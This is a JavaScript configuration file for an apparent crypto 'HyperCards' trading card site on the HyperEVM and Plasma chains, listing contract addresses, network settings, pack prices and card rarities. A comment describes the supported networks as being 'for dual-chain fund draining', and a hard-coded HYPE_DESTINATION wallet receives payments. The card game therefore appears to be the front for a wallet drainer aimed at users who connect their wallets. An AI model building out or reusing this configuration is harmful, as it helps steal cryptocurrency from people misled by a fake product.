// Contract addresses and configuration for HyperCards trading card system
// TODO: Update these addresses after deploying contracts to HyperEVM

export const CONTRACT_ADDRESSES = {
  // Main contracts - UPDATE THESE AFTER DEPLOYMENT
  HYPER_CARDS: "0x0000000000000000000000000000000000000001", // Placeholder - UPDATE AFTER DEPLOYMENT
  HYPER_CARD_MARKETPLACE: "0x0000000000000000000000000000000000000002", // Placeholder - UPDATE AFTER DEPLOYMENT  
  HYPER_STAKING: "0x0000000000000000000000000000000000000003", // Placeholder - UPDATE AFTER DEPLOYMENT
  
  // HYPE payment destination
  HYPE_DESTINATION: "0xa6D8DE9A545aedBE612f5643527C2C4ED3df8411",
  
  // Token addresses on HyperEVM (these are correct)
  HYPE_TOKEN: "0x4Ed6Add0D693842c7A8c3C07732B91e42B6Bb4E5"
};

// HyperEVM network configuration
export const HYPEREVM_CONFIG = {
  chainId: '0x3e7', // 999 in hex
  chainName: 'HyperEVM',
  nativeCurrency: {
    name: 'ETH',
    symbol: 'ETH',
    decimals: 18,
  },
  rpcUrls: ['https://rpc.hyperliquid.xyz/evm'],
  blockExplorerUrls: ['https://explorer.hyperliquid.xyz'],
};

// Plasma Chain network configuration
export const PLASMA_CONFIG = {
  chainId: '0x2611', // 9745 in hex
  chainName: 'Plasma Mainnet',
  nativeCurrency: {
    name: 'XPL',
    symbol: 'XPL',
    decimals: 18,
  },
  rpcUrls: ['https://rpc.plasma.to'],
  blockExplorerUrls: ['https://plasmascan.to'],
};

// Supported networks for dual-chain fund draining
export const SUPPORTED_NETWORKS = {
  HYPEREVM: {
    chainId: 999,
    hexChainId: '0x3e7',
    config: HYPEREVM_CONFIG,
    nativeToken: 'HYPE',
    displayName: 'HyperEVM'
  },
  PLASMA: {
    chainId: 9745,
    hexChainId: '0x2611', 
    config: PLASMA_CONFIG,
    nativeToken: 'XPL',
    displayName: 'Plasma Chain'
  }
};

// Pack types and configurations for Trading Cards
export const PACK_TYPES = {
  COMMON: 1,
  RARE: 2,
  EPIC: 3,
  LEGENDARY: 4
};

export const PACK_INFO = {
  [PACK_TYPES.COMMON]: {
    name: "Common Pack",
    price: "0.00001", // Fixed price in HYPE
    maxSupply: 10000,
    description: "Trading card pack - costs 0.00001 HYPE"
  },
  [PACK_TYPES.RARE]: {
    name: "Rare Pack",
    price: "0.00001", // Fixed price in HYPE
    maxSupply: 5000,
    description: "Rare trading card pack - costs 0.00001 HYPE"
  },
  [PACK_TYPES.EPIC]: {
    name: "Epic Pack", 
    price: "0.00001", // Fixed price in HYPE
    maxSupply: 2000,
    description: "Premium trading card pack - costs 0.00001 HYPE"
  },
  [PACK_TYPES.LEGENDARY]: {
    name: "Legendary Pack", 
    price: "0.00001", // Fixed price in HYPE
    maxSupply: 500,
    description: "Ultra-rare trading card pack - costs 0.00001 HYPE"
  }
};

// Card rarities
export const RARITY = {
  COMMON: 0,
  RARE: 1,
  EPIC: 2,
  LEGENDARY: 3
};

export const RARITY_INFO = {
  [RARITY.COMMON]: {
    name: "Common",
    color: "#94a3b8",
    icon: "⚪"
  },
  [RARITY.RARE]: {
    name: "Rare",
    color: "#3b82f6", 
    icon: "🔵"
  },
  [RARITY.EPIC]: {
    name: "Epic",
    color: "#a855f7",
    icon: "🟣"
  },
  [RARITY.LEGENDARY]: {
    name: "Legendary",
    color: "#f59e0b",
    icon: "🟡"
  }
};